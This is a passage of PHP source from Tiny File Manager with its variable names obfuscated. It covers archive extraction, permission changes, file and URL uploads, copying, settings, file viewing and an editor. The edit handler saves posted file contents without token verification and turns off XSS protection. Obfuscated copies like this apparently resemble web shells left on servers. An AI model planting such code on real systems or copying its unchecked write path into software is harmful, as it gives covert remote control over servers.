FM_Zipper_Tar();$aaaa=$jjjjjj->create($hhhhhh,$lllll);}if($aaaa){fm_set_msg(sprintf(lng('Archive').' <b>%s</b> '.lng('Created'),fm_enc($hhhhhh)));}else{fm_set_msg(lng('Archive not created'),'error');}}else{fm_set_msg(lng('Nothing selected'),'alert');}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(isset($_POST['unzip'],$_POST['token'])&&!FM_READONLY){if(!verifyToken($_POST['token'])){fm_set_msg(lng("Invalid Token."),'error');}$kkkkkk=urldecode($_POST['unzip']);$kkkkkk=fm_clean_path($kkkkkk);$kkkkkk=str_replace('/','',$kkkkkk);$llllll=false;$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}if($kkkkkk!=''&&is_file($iii.'/'.$kkkkkk)){$mmmmmm=$iii.'/'.$kkkkkk;$mmmm=pathinfo($mmmmmm,PATHINFO_EXTENSION);$llllll=true;}else{fm_set_msg(lng('File not found'),'error');}if(($mmmm=="zip"&&!class_exists('ZipArchive'))||($mmmm=="tar"&&!class_exists('PharData'))){fm_set_msg(lng('Operations with archives are not available'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if($llllll){$nnnnnn='';if(isset($_POST['tofolder'])){$nnnnnn=pathinfo($mmmmmm,PATHINFO_FILENAME);if(fm_mkdir($iii.'/'.$nnnnnn,true)){$iii.='/'.$nnnnnn;}}if($mmmm=="zip"){$iiiiii=new FM_Zipper();$aaaa=$iiiiii->unzip($mmmmmm,$iii);}elseif($mmmm=="tar"){try{$oooooo=new PharData($mmmmmm);if(@$oooooo->extractTo($iii,null,true)){$aaaa=true;}else{$aaaa=false;}}catch(Exception $uuu){$aaaa=true;}}if($aaaa){fm_set_msg(lng('Archive unpacked'));}else{fm_set_msg(lng('Archive not unpacked'),'error');}}else{fm_set_msg(lng('File not found'),'error');}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(isset($_POST['chmod'],$_POST['token'])&&!FM_READONLY&&!FM_IS_WIN){if(!verifyToken($_POST['token'])){fm_set_msg(lng("Invalid Token."),'error');}$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}$ww=$_POST['chmod'];$ww=fm_clean_path($ww);$ww=str_replace('/','',$ww);if($ww==''||(!is_file($iii.'/'.$ww)&&!is_dir($iii.'/'.$ww))){fm_set_msg(lng('File not found'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}$pppppp=0;if(!empty($_POST['ur'])){$pppppp|=0400;}if(!empty($_POST['uw'])){$pppppp|=0200;}if(!empty($_POST['ux'])){$pppppp|=0100;}if(!empty($_POST['gr'])){$pppppp|=0040;}if(!empty($_POST['gw'])){$pppppp|=0020;}if(!empty($_POST['gx'])){$pppppp|=0010;}if(!empty($_POST['or'])){$pppppp|=0004;}if(!empty($_POST['ow'])){$pppppp|=0002;}if(!empty($_POST['ox'])){$pppppp|=0001;}if(@chmod($iii.'/'.$ww,$pppppp)){fm_set_msg(lng('Permissions changed'));}else{fm_set_msg(lng('Permissions not changed'),'error');}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}if(!is_dir($iii)){fm_redirect(FM_SELF_URL.'?p=');}$qqqqqq=fm_get_parent_path(FM_PATH);$rrrrrr=is_readable($iii)?scandir($iii):array();$ssssss=array();$lllll=array();$tttttt=array_slice(explode("/",$iii),-1)[0];if(is_array($rrrrrr)&&fm_is_exclude_items($tttttt)){foreach($rrrrrr as $ww){if($ww=='.'||$ww=='..'){continue;}if(!FM_SHOW_HIDDEN&&substr($ww,0,1)==='.'){continue;}$eeeeee=$iii.'/'.$ww;if(@is_file($eeeeee)&&fm_is_exclude_items($ww)){$lllll[]=$ww;}elseif(@is_dir($eeeeee)&&$ww!='.'&&$ww!='..'&&fm_is_exclude_items($ww)){$ssssss[]=$ww;}}}if(!empty($lllll)){natcasesort($lllll);}if(!empty($ssssss)){natcasesort($ssssss);}if(isset($_GET['upload'])&&!FM_READONLY){fm_show_header();fm_show_nav_path(FM_PATH);function getUploadExt(){$uuuuuu=explode(',',FM_UPLOAD_EXTENSION);if(FM_UPLOAD_EXTENSION&&$uuuuuu){array_walk($uuuuuu,function(&$vvvvvv){$vvvvvv=".$vvvvvv";});return implode(',',$uuuuuu);}return'';}?>
    <?php print_external('css-dropzone');?>
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper <?php echo fm_get_theme();?>">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php echo lng('UploadingFiles')?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php echo lng('Upload from URL')?></a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php echo FM_PATH?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back')?></a>
                    <strong><?php echo lng('DestinationFolder')?></strong>: <?php echo fm_enc(fm_convert_win(FM_PATH))?>
                </p>

                <form action="<?php echo htmlspecialchars(FM_SELF_URL).'?p='.fm_enc(FM_PATH)?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH)?>">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php echo fm_enc(FM_PATH)?>">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <button type="submit" class="btn btn-primary ms-3"><?php echo lng('Upload')?></button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <?php print_external('js-dropzone');?>
    <script>
        Dropzone.options.fileUploader = {
            chunking: true,
            chunkSize: <?php echo UPLOAD_CHUNK_SIZE;?>,
            forceChunking: true,
            retryChunks: true,
            retryChunksLimit: 3,
            parallelUploads: 1,
            parallelChunkUploads: false,
            timeout: 120000,
            maxFilesize: "<?php echo MAX_UPLOAD_SIZE;?>",
            acceptedFiles : "<?php echo getUploadExt()?>",
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    let _response = JSON.parse(res.xhr.response);

                    if(_response.status == "error") {
                        toast(_response.info);
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
    <?php
 fm_show_footer();exit;}if(isset($_POST['copy'])&&!FM_READONLY){$wwwwww=isset($_POST['file'])?$_POST['file']:null;if(!is_array($wwwwww)||empty($wwwwww)){fm_set_msg(lng('Nothing selected'),'alert');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}fm_show_header();fm_show_nav_path(FM_PATH);?>
    <div class="path">
        <div class="card <?php echo fm_get_theme();?>">
            <div class="card-header">
                <h6><?php echo lng('Copying')?></h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH)?>">
                    <input type="hidden" name="finish" value="1">
                    <?php
 foreach($wwwwww as $xxxxxx){echo '<input type="hidden" name="file[]" value="'.fm_enc($xxxxxx).'">'.PHP_EOL;}?>
                    <p class="break-word"><strong><?php echo lng('Files')?></strong>: <b><?php echo implode('</b>, <b>',$wwwwww)?></b></p>
                    <p class="break-word"><strong><?php echo lng('SourceFolder')?></strong>: <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH.'/'.FM_PATH))?><br>
                        <label for="inp_copy_to"><strong><?php echo lng('DestinationFolder')?></strong>:</label>
                        <?php echo FM_ROOT_PATH?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php echo fm_enc(FM_PATH)?>">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> <?php echo lng('Move')?></label></p>
                    <p>
                        <b><a href="?p=<?php echo urlencode(FM_PATH)?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel')?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Copy')?></button> 
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php
 fm_show_footer();exit;}if(isset($_GET['copy'])&&!isset($_GET['finish'])&&!FM_READONLY){$xxxx=$_GET['copy'];$xxxx=fm_clean_path($xxxx);if($xxxx==''||!file_exists(FM_ROOT_PATH.'/'.$xxxx)){fm_set_msg(lng('File not found'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}fm_show_header();fm_show_nav_path(FM_PATH);?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            <strong>Source path:</strong> <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH.'/'.$xxxx))?><br>
            <strong>Destination folder:</strong> <?php echo fm_enc(fm_convert_win(FM_ROOT_PATH.'/'.FM_PATH))?>
        </p>
        <p>
            <b><a href="?p=<?php echo urlencode(FM_PATH)?>&amp;copy=<?php echo urlencode($xxxx)?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH)?>&amp;copy=<?php echo urlencode($xxxx)?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH)?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php echo lng('Select folder')?></i></p>
        <ul class="folders break-word">
            <?php
 if($qqqqqq!==false){?>
                <li><a href="?p=<?php echo urlencode($qqqqqq)?>&amp;copy=<?php echo urlencode($xxxx)?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php
}foreach($ssssss as $mmmmm){?>
                <li>
                    <a href="?p=<?php echo urlencode(trim(FM_PATH.'/'.$mmmmm,'/'))?>&amp;copy=<?php echo urlencode($xxxx)?>"><i class="fa fa-folder-o"></i> <?php echo fm_convert_win($mmmmm)?></a></li>
                <?php
}?>
        </ul>
    </div>
    <?php
 fm_show_footer();exit;}if(isset($_GET['settings'])&&!FM_READONLY){fm_show_header();fm_show_nav_path(FM_PATH);global $nn,$oo,$tt;?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme();?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-cog"></i>  <?php echo lng('Settings')?></span>
                <a href="?p=<?php echo FM_PATH?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php echo lng('Language')?></label>
                        <div class="col-sm-5">
                            <select class="form-select" id="js-language" name="js-language">
                                <?php
 function getSelected($yyyyyy){global $oo;return($oo==$yyyyyy)?'selected':'';}foreach($tt as $zzzzzz=>$aaaaaaa){echo"<option value='$zzzzzz' ".getSelected($zzzzzz).">$aaaaaaa</option>";}?>
                            </select>
                        </div>
                    </div>
                    <div class="mt-3 mb-3 row ">
                        <label for="js-error-report" class="col-sm-3 col-form-label"><?php echo lng('ErrorReporting')?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-error-report" name="js-error-report" value="true" <?php echo $qq?'checked':'';?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-show-hidden" class="col-sm-3 col-form-label"><?php echo lng('ShowHiddenFiles')?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-show-hidden" name="js-show-hidden" value="true" <?php echo $pp?'checked':'';?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-hide-cols" class="col-sm-3 col-form-label"><?php echo lng('HideColumns')?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-hide-cols" name="js-hide-cols" value="true" <?php echo $rr?'checked':'';?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php echo lng('Theme')?></label>
                        <div class="col-sm-5">
                            <select class="form-select w-100" id="js-3-0" name="js-theme-3">
                                <option value='light' <?php if($ss=="light"){echo "selected";}?>><?php echo lng('light')?></option>
                                <option value='dark' <?php if($ss=="dark"){echo "selected";}?>><?php echo lng('dark')?></option>
                            </select>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php echo lng('Save');?></button>
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>
    <?php
 fm_show_footer();exit;}if(isset($_GET['help'])){fm_show_header();fm_show_nav_path(FM_PATH);global $nn,$oo;?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme();?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-exclamation-circle"></i> <?php echo lng('Help')?></span>
                <a href="?p=<?php echo FM_PATH?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Tiny File Manager <?php echo VERSION;?></a></h3></p>
                        <p>Author: Prasath Mani</p>
                        <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers[at]gmail.com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/wiki" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents')?> </a> </li>
                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/issues" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue')?></a></li>
                                <?php if(!FM_READONLY){?>
                                <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php echo lng('Generate new password hash')?></a></li>
                                <?php }?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php echo lng('Generate new password hash')?></label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php echo lng('Password')?></label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php echo lng('Password')?>" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php echo lng('Generate')?></button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php
 fm_show_footer();exit;}if(isset($_GET['view'])){$ww=$_GET['view'];$ww=fm_clean_path($ww,false);$ww=str_replace('/','',$ww);if($ww==''||!is_file($iii.'/'.$ww)||in_array($ww,$GLOBALS['exclude_items'])){fm_set_msg(lng('File not found'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}fm_show_header();fm_show_nav_path(FM_PATH);$bbbbbbb=FM_ROOT_URL.fm_convert_win((FM_PATH!=''?'/'.FM_PATH:'').'/'.$ww);$kkk=$iii.'/'.$ww;$mmmm=strtolower(pathinfo($kkk,PATHINFO_EXTENSION));$ccccccc=fm_get_mime_type($kkk);$ddddddd=fm_get_size($kkk);$eeeeeee=fm_get_filesize($ddddddd);$fffffff=false;$ggggggg=false;$hhhhhhh=false;$iiiiiii=false;$jjjjjjj=false;$kkkkkkk=false;$lllllll=false;$mmmmmmm='File';$nnnnnnn=false;$ooooooo='';$cc=strtolower(FM_DOC_VIEWER);if($cc&&$cc!=='false'&&in_array($mmmm,fm_get_onlineViewer_exts())){$lllllll=true;}elseif($mmmm=='zip'||$mmmm=='tar'){$fffffff=true;$mmmmmmm='Archive';$nnnnnnn=fm_get_zif_info($kkk,$mmmm);}elseif(in_array($mmmm,fm_get_image_exts())){$hhhhhhh=true;$mmmmmmm='Image';}elseif(in_array($mmmm,fm_get_audio_exts())){$iiiiiii=true;$mmmmmmm='Audio';}elseif(in_array($mmmm,fm_get_video_exts())){$jjjjjjj=true;$mmmmmmm='Video';}elseif(in_array($mmmm,fm_get_text_exts())||substr($ccccccc,0,4)=='text'||in_array($ccccccc,fm_get_text_mimes())){$kkkkkkk=true;$ooooooo=file_get_contents($kkk);}?>
    <div class="row">
        <div class="col-12">
            <p class="break-word"><b><?php echo lng($mmmmmmm)?> "<?php echo fm_enc(fm_convert_win($ww))?>"</b></p>
            <p class="break-word">
                <strong>Full path:</strong> <?php echo fm_enc(fm_convert_win($kkk))?><br>
                <strong>File size:</strong> <?php echo($ddddddd<=1000)?"$ddddddd bytes":$eeeeeee;?><br>
                <strong>MIME-type:</strong> <?php echo $ccccccc?><br>
                <?php
 if(($fffffff||$ggggggg)&&$nnnnnnn!==false){$ppppppp=0;$qqqqqqq=0;$rrrrrrr=0;foreach($nnnnnnn as $sssssss){if(!$sssssss['folder']){$ppppppp++;}$qqqqqqq+=$sssssss['compressed_size'];$rrrrrrr+=$sssssss['filesize'];}?>
                    <?php echo lng('Files in archive')?>: <?php echo $ppppppp?><br>
                    <?php echo lng('Total size')?>: <?php echo fm_get_filesize($rrrrrrr)?><br>
                    <?php echo lng('Size in archive')?>: <?php echo fm_get_filesize($qqqqqqq)?><br>
                    <?php echo lng('Compression')?>: <?php echo round(($qqqqqqq/max($rrrrrrr,1))*100)?>%<br>
                    <?php
}if($hhhhhhh){$ttttttt=getimagesize($kkk);echo lng('Image sizes').': '.(isset($ttttttt[0])?$ttttttt[0]:'0').' x '.(isset($ttttttt[1])?$ttttttt[1]:'0').'<br>';}if($kkkkkkk){$uuuuuuu=fm_is_utf8($ooooooo);if(function_exists('iconv')){if(!$uuuuuuu){$ooooooo=iconv(FM_ICONV_INPUT_ENC,'UTF-8//IGNORE',$ooooooo);}}echo '<strong>'.lng('Charset').':</strong> '.($uuuuuuu?'utf-8':'8 bit').'<br>';}?>
            </p>
            <div class="d-flex align-items-center mb-3">
                <form method="post" class="d-inline ms-2" action="?p=<?php echo urlencode(FM_PATH)?>&amp;dl=<?php echo urlencode($ww)?>">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                    <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php echo lng('Download')?></button> &nbsp;
                </form>
                <b class="ms-2"><a href="<?php echo fm_enc($bbbbbbb)?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php echo lng('Open')?></a></b>
                <?php
 if(!FM_READONLY&&($fffffff||$ggggggg)&&$nnnnnnn!==false){$vvvvvvv=pathinfo($kkk,PATHINFO_FILENAME);?>
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($ww);?>">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php echo lng('UnZip')?></button>
                    </form>&nbsp;
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($ww);?>">
                        <input type="hidden" name="tofolder" value="1">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php echo fm_enc($vvvvvvv)?>"><i class="fa fa-check-circle"></i> <?php echo lng('UnZipToFolder')?></button>
                    </form>&nbsp;
                    <?php
}if($kkkkkkk&&!FM_READONLY){?>
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;edit=<?php echo urlencode($ww)?>" class="edit-file"><i class="fa fa-pencil-square"></i> <?php echo lng('Edit')?>
                        </a></b> &nbsp;
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;edit=<?php echo urlencode($ww)?>&env=ace"
                            class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor')?>
                        </a></b> &nbsp;
                <?php }?>
                <b class="ms-2"><a href="?p=<?php echo urlencode(FM_PATH)?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back')?></a></b>
            </div>
            <?php
 if($lllllll){if($cc=='google'){echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url='.fm_enc($bbbbbbb).'" frameborder="no" style="width:100%;min-height:460px"></iframe>';}else if($cc=='microsoft'){echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src='.fm_enc($bbbbbbb).'" frameborder="no" style="width:100%;min-height:460px"></iframe>';}}elseif($fffffff){if($nnnnnnn!==false){echo '<code class="maxheight">';foreach($nnnnnnn as $sssssss){if($sssssss['folder']){echo '<b>'.fm_enc($sssssss['name']).'</b><br>';}else{echo $sssssss['name'].' ('.fm_get_filesize($sssssss['filesize']).')<br>';}}echo '</code>';}else{echo '<p>'.lng('Error while fetching archive info').'</p>';}}elseif($hhhhhhh){if(in_array($mmmm,array('gif','jpg','jpeg','png','bmp','ico','svg','webp','avif'))){echo '<p><img src="'.fm_enc($bbbbbbb).'" alt="image" class="preview-img-container" class="preview-img"></p>';}}elseif($iiiiiii){echo '<p><audio src="'.fm_enc($bbbbbbb).'" controls preload="metadata"></audio></p>';}elseif($jjjjjjj){echo '<div class="preview-video"><video src="'.fm_enc($bbbbbbb).'" width="640" height="360" controls preload="metadata"></video></div>';}elseif($kkkkkkk){if(FM_USE_HIGHLIGHTJS){$wwwwwww=array('shtml'=>'xml','htaccess'=>'apache','phtml'=>'php','lock'=>'json','svg'=>'xml',);$xxxxxxx=isset($wwwwwww[$mmmm])?'lang-'.$wwwwwww[$mmmm]:'lang-'.$mmmm;if(empty($mmmm)||in_array(strtolower($ww),fm_get_text_names())||preg_match('#\.min\.(css|js)$#i',$ww)){$xxxxxxx='nohighlight';}$ooooooo='<pre class="with-hljs"><code class="'.$xxxxxxx.'">'.fm_enc($ooooooo).'</code></pre>';}elseif(in_array($mmmm,array('php','php4','php5','phtml','phps'))){$ooooooo=highlight_string($ooooooo,true);}else{$ooooooo='<pre>'.fm_enc($ooooooo).'</pre>';}echo $ooooooo;}?>
        </div>
    </div>
    <?php
 fm_show_footer();exit;}if(isset($_GET['edit'])&&!FM_READONLY){$ww=$_GET['edit'];$ww=fm_clean_path($ww,false);$ww=str_replace('/','',$ww);if($ww==''||!is_file($iii.'/'.$ww)||in_array($ww,$GLOBALS['exclude_items'])){fm_set_msg(lng('File not found'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}$yyyyyyy=' : <i><b>'.$ww.'</b></i>';header('X-XSS-Protection:0');fm_show_header();fm_show_nav_path(FM_PATH);$bbbbbbb=FM_ROOT_URL.fm_convert_win((FM_PATH!=''?'/'.FM_PATH:'').'/'.$ww);$kkk=$iii.'/'.$ww;$zzzzzzz=true;if(isset($_GET['env'])){if($_GET['env']=="ace"){$zzzzzzz=false;}}if(isset($_POST['savedata'])){$lll=$_POST['savedata'];$mmm=fopen($kkk,"w");@fwrite($mmm,$lll);fclose($mmm);fm_set_msg(lng('File Saved Successfully'));}$mmmm=strtolower(pathinfo($kkk,PATHINFO_EXTENSION));$ccccccc=fm_get_mime_type($kkk);$eeeeeee=filesize($kkk);$kkkkkkk=false;$ooooooo='';if(in_array($mmmm,fm_get_text_exts())||substr($ccccccc,0,4)=='text'||in_array($ccccccc,fm_get_text_mimes())){$kkkkkkk=true;$ooooooo=file_get_contents($kkk);}?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php if(!$zzzzzzz){?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php echo lng('Fullscreen')?>"><i class="fa fa-expand" title="<?php echo lng('Fullscreen')?>"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php echo lng('Search')?>"><i class="fa fa-search" title="<?php echo lng('Search')?>"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php echo lng('Undo')?>"><i class="fa fa-undo" title="<?php echo lng('Undo')?>"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php echo lng('Redo')?>"><i class="fa fa-repeat" title="<?php echo lng('Redo')?>"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php echo lng('Word Wrap')?>"><i class="fa fa-text-width" title="<?php echo lng('Word Wrap')?>"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="<?php echo lng('Select Document Type')?>" class="btn-outline-secondary border-start-0 d-none d-md-block"><option>-- <?php echo lng('Select Mode')?> --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="<?php echo lng('Select Theme')?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Theme')?> --</option></select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php echo lng('Select Font Size')?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Font Size')?> --</option></select>
                        </div>
                    <?php }?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                <a title="<?php echo lng('Back')?>" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;view=<?php echo urlencode($ww)?>"><i class="fa fa-reply-all"></i> <?php echo lng('Back')?></a>
                <a title="<?php echo lng('BackUp')?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php echo urlencode(trim(FM_PATH))?>','<?php echo urlencode($ww)?>')"><i class="fa fa-database"></i> <?php echo lng('BackUp')?></a>
                <?php if($kkkkkkk){?>
                    <?php if($zzzzzzz){?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;edit=<?php echo urlencode($ww)?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor')?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($bbbbbbb)?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php }else{?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH))?>&amp;edit=<?php echo urlencode($ww)?>"><i class="fa fa-text-height"></i> <?php echo lng('NormalEditor')?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($bbbbbbb)?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php echo lng('Save')?>
                        </button>
                    <?php }?>
                <?php }?>
            </div>
        </div>
        <?php
 if($kkkkkkk&&$zzzzzzz){echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">'.htmlspecialchars($ooooooo).'</textarea>';echo '<script>document.addEventListener("keydown", function(e) {if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)  && e.keyCode == 83) { e.preventDefault();edit_save(this,"nrl");}}, false);</script>';}elseif($kkkkkkk){echo '<div id="editor" contenteditable="true">'.htmlspecialchars($ooooooo).'</div>';}else{fm_set_msg(lng('FILE EXTENSION HAS NOT SUPPORTED'),'error');}?>
    </div>
    <?php
